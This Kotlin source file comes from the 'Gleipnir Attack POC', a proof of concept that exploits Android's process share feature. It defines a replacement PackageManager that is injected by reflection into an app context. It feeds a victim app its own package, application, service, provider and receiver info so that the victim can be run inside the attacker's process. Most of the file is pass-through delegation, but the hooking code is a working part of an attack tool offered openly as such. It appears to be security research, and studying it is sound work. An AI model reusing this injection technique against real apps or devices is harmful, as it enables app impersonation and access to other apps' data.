/*
 * Gleipnir Attack POC - Exploiting the Android process share feature
 * Copyright (C) <2020>  <Sascha Roth>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package org.gleipnir.app.helpers

import android.content.ComponentName
import android.content.ContextWrapper
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.*
import android.content.res.Resources
import android.content.res.XmlResourceParser
import android.graphics.Rect
import android.graphics.drawable.Drawable
import android.os.Bundle
import android.os.UserHandle
import org.gleipnir.app.extendableLoader.log
import org.gleipnir.app.reflectionHelper.setReflective

/**
 * We replace the original package manager to control the data the victim App will get.
 *
 * We have to care about getIdentifier(...) calls regarding the package name.
 *
 * Also some get[Component]Info calls must be hooked in order to return the victim info objects.
 * The PackageManagerService would throw an exception because these components are not in the Gleipnir
 * AndroidManifest.
 */
class PackageManagerHelper(
    val originalPackageManager: PackageManager,
    val targetPackageInfo: PackageInfo
) : PackageManager() {

    companion object {
        fun inject(context: ContextWrapper, targetPackageInfo: PackageInfo) {
            log("PackageManagerHelper [-] inject PackageManagerHelper into $context")
            if (context is ContextWrapper) {
                try {
                    setReflective(
                        context.baseContext,
                        "mPackageManager",
                        PackageManagerHelper(context.packageManager, targetPackageInfo)
                    )
                } catch (exception: Exception) {
                    // this can fail...
                    log("PackageManagerHelper [-] failed to inject: $exception")
                }
            }
        }
    }

    override fun getLaunchIntentForPackage(p0: String): Intent? {
        return originalPackageManager.getLaunchIntentForPackage(p0)
    }

    override fun getResourcesForApplication(p0: ApplicationInfo): Resources {
        return originalPackageManager.getResourcesForApplication(p0)
    }

    override fun getResourcesForApplication(p0: String): Resources {
        return originalPackageManager.getResourcesForApplication(p0)
    }

    override fun getReceiverInfo(p0: ComponentName, p1: Int): ActivityInfo {
        log("getReceiverInfo")

        targetPackageInfo.receivers?.find { p0.className == it.name }?.let {
            return@getReceiverInfo it
        }
        return originalPackageManager.getReceiverInfo(p0, p1)
    }

    override fun queryIntentActivityOptions(
        p0: ComponentName?,
        p1: Array<out Intent>?,
        p2: Intent,
        p3: Int
    ): MutableList<ResolveInfo> {
        return originalPackageManager.queryIntentActivityOptions(p0, p1, p2, p3)
    }

    override fun getApplicationIcon(p0: ApplicationInfo): Drawable {
        return originalPackageManager.getApplicationIcon(p0)
    }

    override fun getApplicationIcon(p0: String): Drawable {
        return originalPackageManager.getApplicationIcon(p0)
    }

    override fun extendVerificationTimeout(p0: Int, p1: Int, p2: Long) {
        originalPackageManager.extendVerificationTimeout(p0, p1, p2)
    }

    override fun getApplicationEnabledSetting(p0: String): Int {
        return originalPackageManager.getApplicationEnabledSetting(p0)
    }

    override fun queryIntentServices(p0: Intent, p1: Int): MutableList<ResolveInfo> {
        return originalPackageManager.queryIntentServices(p0, p1)
    }

    override fun isPermissionRevokedByPolicy(p0: String, p1: String): Boolean {
        return originalPackageManager.isPermissionRevokedByPolicy(p0, p1)
    }

    override fun checkPermission(p0: String, p1: String): Int {
        return originalPackageManager.checkPermission(p0, p1)
    }

    override fun checkSignatures(p0: String, p1: String): Int {
        return originalPackageManager.checkSignatures(p0, p1)
    }

    override fun checkSignatures(p0: Int, p1: Int): Int {
        return originalPackageManager.checkSignatures(p0, p1)
    }

    override fun removePackageFromPreferred(p0: String) {
        originalPackageManager.removePackageFromPreferred(p0)
    }

    override fun addPermission(p0: PermissionInfo): Boolean {
        return originalPackageManager.addPermission(p0)
    }

    override fun getDrawable(p0: String, p1: Int, p2: ApplicationInfo?): Drawable? {
        return originalPackageManager.getDrawable(p0, p1, p2)
    }

    override fun getChangedPackages(p0: Int): ChangedPackages? {
        return originalPackageManager.getChangedPackages(p0)
    }

    /**
     * Return target applications package info
     */
    override fun getPackageInfo(p0: String, p1: Int): PackageInfo {
        if (p0 == targetPackageInfo.packageName) {
            log("PackageManagerHelper [-] forward target package info ${p0}")
            return targetPackageInfo
        }
        return originalPackageManager.getPackageInfo(p0, p1)
    }

    /**
     * Return target applications package info
     */
    override fun getPackageInfo(p0: VersionedPackage, p1: Int): PackageInfo {
        log("PackageManagerHelper [-] forward target package info ${p0}")
        return targetPackageInfo
    }

    override fun getPackagesHoldingPermissions(
        p0: Array<String>,
        p1: Int
    ): MutableList<PackageInfo> {
        return originalPackageManager.getPackagesHoldingPermissions(p0, p1)
    }

    override fun addPermissionAsync(p0: PermissionInfo): Boolean {
        return originalPackageManager.addPermissionAsync(p0)
    }

    override fun getSystemAvailableFeatures(): Array<FeatureInfo> {
        return originalPackageManager.getSystemAvailableFeatures()
    }

    override fun getSystemSharedLibraryNames(): Array<String>? {
        return originalPackageManager.getSystemSharedLibraryNames()
    }

    override fun queryIntentContentProviders(p0: Intent, p1: Int): MutableList<ResolveInfo> {
        return originalPackageManager.queryIntentContentProviders(p0, p1)
    }

    override fun getApplicationBanner(p0: ApplicationInfo): Drawable? {
        return originalPackageManager.getApplicationBanner(p0)
    }

    override fun getApplicationBanner(p0: String): Drawable? {
        return originalPackageManager.getApplicationBanner(p0)
    }

    override fun getPackageGids(p0: String): IntArray {
        return originalPackageManager.getPackageGids(p0)
    }

    override fun getPackageGids(p0: String, p1: Int): IntArray {
        return originalPackageManager.getPackageGids(p0, p1)
    }

    override fun getResourcesForActivity(p0: ComponentName): Resources {
        return originalPackageManager.getResourcesForActivity(p0)
    }

    override fun getPackagesForUid(p0: Int): Array<String>? {
        return originalPackageManager.getPackagesForUid(p0)
    }

    override fun getPermissionGroupInfo(p0: String, p1: Int): PermissionGroupInfo {
        return originalPackageManager.getPermissionGroupInfo(p0, p1)
    }

    override fun addPackageToPreferred(p0: String) {
        originalPackageManager.addPackageToPreferred(p0)
    }

    override fun getComponentEnabledSetting(p0: ComponentName): Int {
        return originalPackageManager.getComponentEnabledSetting(p0)
    }

    override fun getLeanbackLaunchIntentForPackage(p0: String): Intent? {
        return originalPackageManager.getLeanbackLaunchIntentForPackage(p0)
    }

    override fun getInstalledPackages(p0: Int): MutableList<PackageInfo> {
        return originalPackageManager.getInstalledPackages(p0)
    }

    override fun getAllPermissionGroups(p0: Int): MutableList<PermissionGroupInfo> {
        return originalPackageManager.getAllPermissionGroups(p0)
    }

    override fun getNameForUid(p0: Int): String? {
        return originalPackageManager.getNameForUid(p0)
    }

    override fun updateInstantAppCookie(p0: ByteArray?) {
        originalPackageManager.updateInstantAppCookie(p0)
    }

    override fun getApplicationLogo(p0: ApplicationInfo): Drawable? {
        return originalPackageManager.getApplicationLogo(p0)
    }

    override fun getApplicationLogo(p0: String): Drawable? {
        return originalPackageManager.getApplicationLogo(p0)
    }

    override fun getApplicationLabel(p0: ApplicationInfo): CharSequence {
        return originalPackageManager.getApplicationLabel(p0)
    }

    override fun getPreferredActivities(
        p0: MutableList<IntentFilter>,
        p1: MutableList<ComponentName>,
        p2: String?
    ): Int {
        return originalPackageManager.getPreferredActivities(p0, p1, p2)
    }

    override fun setApplicationCategoryHint(p0: String, p1: Int) {
        originalPackageManager.setApplicationCategoryHint(p0, p1)
    }

    override fun setInstallerPackageName(p0: String, p1: String?) {
        originalPackageManager.setInstallerPackageName(p0, p1)
    }

    override fun getUserBadgedLabel(p0: CharSequence, p1: UserHandle): CharSequence {
        return originalPackageManager.getUserBadgedLabel(p0, p1)
    }

    override fun canRequestPackageInstalls(): Boolean {
        return originalPackageManager.canRequestPackageInstalls()
    }

    override fun isInstantApp(): Boolean {
        return originalPackageManager.isInstantApp()
    }

    override fun isInstantApp(p0: String): Boolean {
        return originalPackageManager.isInstantApp(p0)
    }

    override fun getActivityIcon(p0: ComponentName): Drawable {
        return originalPackageManager.getActivityIcon(p0)
    }

    override fun getActivityIcon(p0: Intent): Drawable {
        return originalPackageManager.getActivityIcon(p0)
    }

    override fun canonicalToCurrentPackageNames(p0: Array<String>): Array<String> {
        return originalPackageManager.canonicalToCurrentPackageNames(p0)
    }

    override fun getProviderInfo(p0: ComponentName, p1: Int): ProviderInfo {
        log("PackageManagerHelper [-] searching provider info for name $p0")
        targetPackageInfo.providers?.forEach {
            if (it.name == p0.className) return@getProviderInfo it
        }
        return originalPackageManager.getProviderInfo(p0, p1)
    }

    override fun clearPackagePreferredActivities(p0: String) {
        originalPackageManager.clearPackagePreferredActivities(p0)
    }

    override fun getPackageInstaller(): PackageInstaller {
        return originalPackageManager.getPackageInstaller()
    }

    override fun resolveService(p0: Intent, p1: Int): ResolveInfo? {
        return originalPackageManager.resolveService(p0, p1)
    }

    override fun verifyPendingInstall(p0: Int, p1: Int) {
        originalPackageManager.verifyPendingInstall(p0, p1)
    }

    override fun getInstantAppCookie(): ByteArray {
        return originalPackageManager.getInstantAppCookie()
    }

    override fun getText(p0: String, p1: Int, p2: ApplicationInfo?): CharSequence? {
        return originalPackageManager.getText(p0, p1, p2)
    }

    override fun resolveContentProvider(p0: String?, p1: Int): ProviderInfo? {
        log("PackageManagerHelper [-] searching provider info for authority $p0")
        targetPackageInfo.providers?.forEach {
            if (it.authority == p0) return@resolveContentProvider it
        }
        return originalPackageManager.resolveContentProvider(p0, p1)
    }

    override fun hasSystemFeature(p0: String): Boolean {
        return originalPackageManager.hasSystemFeature(p0)
    }

    override fun hasSystemFeature(p0: String, p1: Int): Boolean {
        return originalPackageManager.hasSystemFeature(p0, p1)
    }

    override fun getInstrumentationInfo(p0: ComponentName, p1: Int): InstrumentationInfo {
        return originalPackageManager.getInstrumentationInfo(p0, p1)
    }

    override fun getInstalledApplications(p0: Int): MutableList<ApplicationInfo> {
        return originalPackageManager.getInstalledApplications(p0)
    }

    override fun getUserBadgedDrawableForDensity(
        p0: Drawable,
        p1: UserHandle,
        p2: Rect?,
        p3: Int
    ): Drawable {
        return originalPackageManager.getUserBadgedDrawableForDensity(p0, p1, p2, p3)
    }

    override fun getInstantAppCookieMaxBytes(): Int {
        return originalPackageManager.getInstantAppCookieMaxBytes()
    }

    override fun getDefaultActivityIcon(): Drawable {
        return originalPackageManager.getDefaultActivityIcon()
    }

    override fun getPreferredPackages(p0: Int): MutableList<PackageInfo> {
        return originalPackageManager.getPreferredPackages(p0)
    }

    override fun addPreferredActivity(
        p0: IntentFilter,
        p1: Int,
        p2: Array<ComponentName>?,
        p3: ComponentName
    ) {
        originalPackageManager.addPreferredActivity(p0, p1, p2, p3)
    }

    override fun getSharedLibraries(p0: Int): MutableList<SharedLibraryInfo> {
        return originalPackageManager.getSharedLibraries(p0)
    }

    override fun queryIntentActivities(p0: Intent, p1: Int): MutableList<ResolveInfo> {
        return originalPackageManager.queryIntentActivities(p0, p1)
    }

    override fun getActivityBanner(p0: ComponentName): Drawable? {
        return originalPackageManager.getActivityBanner(p0)
    }

    override fun getActivityBanner(p0: Intent): Drawable? {
        return originalPackageManager.getActivityBanner(p0)
    }

    override fun setComponentEnabledSetting(p0: ComponentName, p1: Int, p2: Int) {
        try {
            originalPackageManager.setComponentEnabledSetting(p0, p1, p2)
        } catch (exception: Exception) {
            log("PackageManagerHelper [-] error while set component enabled settings", exception)
        }
    }

    /**
     * Return our target app's application info
     */
    override fun getApplicationInfo(p0: String, p1: Int): ApplicationInfo {
        log("PackageManagerHelper [-] forward target application info")
        return targetPackageInfo.applicationInfo
    }

    override fun resolveActivity(p0: Intent, p1: Int): ResolveInfo? {
        return originalPackageManager.resolveActivity(p0, p1)
    }

    override fun queryBroadcastReceivers(p0: Intent, p1: Int): MutableList<ResolveInfo> {
        return originalPackageManager.queryBroadcastReceivers(p0, p1)
    }

    override fun getXml(p0: String, p1: Int, p2: ApplicationInfo?): XmlResourceParser? {
        return originalPackageManager.getXml(p0, p1, p2)
    }

    override fun getActivityLogo(p0: ComponentName): Drawable? {
        return originalPackageManager.getActivityLogo(p0)
    }

    override fun getActivityLogo(p0: Intent): Drawable? {
        return originalPackageManager.getActivityLogo(p0)
    }

    override fun queryPermissionsByGroup(p0: String, p1: Int): MutableList<PermissionInfo> {
        return originalPackageManager.queryPermissionsByGroup(p0, p1)
    }

    override fun queryContentProviders(p0: String?, p1: Int, p2: Int): MutableList<ProviderInfo> {
        return originalPackageManager.queryContentProviders(p0, p1, p2)
    }

    override fun getPermissionInfo(p0: String, p1: Int): PermissionInfo {
        return originalPackageManager.getPermissionInfo(p0, p1)
    }

    override fun removePermission(p0: String) {
        originalPackageManager.removePermission(p0)
    }

    override fun queryInstrumentation(p0: String, p1: Int): MutableList<InstrumentationInfo> {
        return originalPackageManager.queryInstrumentation(p0, p1)
    }

    override fun clearInstantAppCookie() {
        originalPackageManager.clearInstantAppCookie()
    }

    override fun currentToCanonicalPackageNames(p0: Array<String>): Array<String> {
        return originalPackageManager.currentToCanonicalPackageNames(p0)
    }

    override fun getPackageUid(p0: String, p1: Int): Int {
        return originalPackageManager.getPackageUid(p0, p1)
    }

    override fun getUserBadgedIcon(p0: Drawable, p1: UserHandle): Drawable {
        return originalPackageManager.getUserBadgedIcon(p0, p1)
    }

    override fun getActivityInfo(p0: ComponentName, p1: Int): ActivityInfo {
        return originalPackageManager.getActivityInfo(p0, p1)
    }

    override fun isSafeMode(): Boolean {
        return originalPackageManager.isSafeMode()
    }

    override fun getInstallerPackageName(p0: String): String? {
        return originalPackageManager.getInstallerPackageName(p0)
    }

    override fun setApplicationEnabledSetting(p0: String, p1: Int, p2: Int) {
        originalPackageManager.setApplicationEnabledSetting(p0, p1, p2)
    }

    override fun getServiceInfo(p0: ComponentName, p1: Int): ServiceInfo {
        log("PackageManagerHelper [+] getServiceInfo [+] get service info $p0")
        targetPackageInfo.services?.forEach {
            if (it.name == p0.className) {
                log("PackageManagerHelper [-] getServiceInfo [-] return ${it} with metadata ${it.metaData}")
                return@getServiceInfo it
            }
        }
        try {
            return originalPackageManager.getServiceInfo(p0, p1)
        } catch (exception: Exception) {
            log("PackageManagerHelper [-] getServiceInfo", exception)
            throw exception
        }
    }

    override fun getInstalledModules(flags: Int): MutableList<ModuleInfo> {
        return originalPackageManager.getInstalledModules(flags)
    }

    override fun getSuspendedPackageAppExtras(): Bundle? {
        return originalPackageManager.getSuspendedPackageAppExtras()
    }

    override fun getWhitelistedRestrictedPermissions(
        packageName: String,
        whitelistFlag: Int
    ): MutableSet<String> {
        return originalPackageManager.getWhitelistedRestrictedPermissions(
            packageName,
            whitelistFlag
        )
    }

    override fun getPackageArchiveInfo(archiveFilePath: String, flags: Int): PackageInfo? {
        return originalPackageManager.getPackageArchiveInfo(archiveFilePath, flags)
    }

    override fun isPackageSuspended(packageName: String): Boolean {
        return originalPackageManager.isPackageSuspended(packageName)
    }

    override fun isPackageSuspended(): Boolean {
        return originalPackageManager.isPackageSuspended()
    }

    override fun equals(other: Any?): Boolean {
        return originalPackageManager.equals(other)
    }

    override fun isDeviceUpgrading(): Boolean {
        return originalPackageManager.isDeviceUpgrading()
    }

    override fun hasSigningCertificate(
        packageName: String,
        certificate: ByteArray,
        type: Int
    ): Boolean {
        return originalPackageManager.hasSigningCertificate(packageName, certificate, type)
    }

    override fun hasSigningCertificate(uid: Int, certificate: ByteArray, type: Int): Boolean {
        return originalPackageManager.hasSigningCertificate(uid, certificate, type)
    }

    override fun getSyntheticAppDetailsActivityEnabled(packageName: String): Boolean {
        return originalPackageManager.getSyntheticAppDetailsActivityEnabled(packageName)
    }

    override fun hashCode(): Int {
        return originalPackageManager.hashCode()
    }

    override fun toString(): String {
        return originalPackageManager.toString()
    }

    override fun getModuleInfo(packageName: String, flags: Int): ModuleInfo {
        return originalPackageManager.getModuleInfo(packageName, flags)
    }

    override fun addWhitelistedRestrictedPermission(
        packageName: String,
        permission: String,
        whitelistFlags: Int
    ): Boolean {
        return originalPackageManager.addWhitelistedRestrictedPermission(
            packageName,
            permission,
            whitelistFlags
        )
    }

    override fun removeWhitelistedRestrictedPermission(
        packageName: String,
        permission: String,
        whitelistFlags: Int
    ): Boolean {
        return originalPackageManager.removeWhitelistedRestrictedPermission(
            packageName,
            permission,
            whitelistFlags
        )
    }
}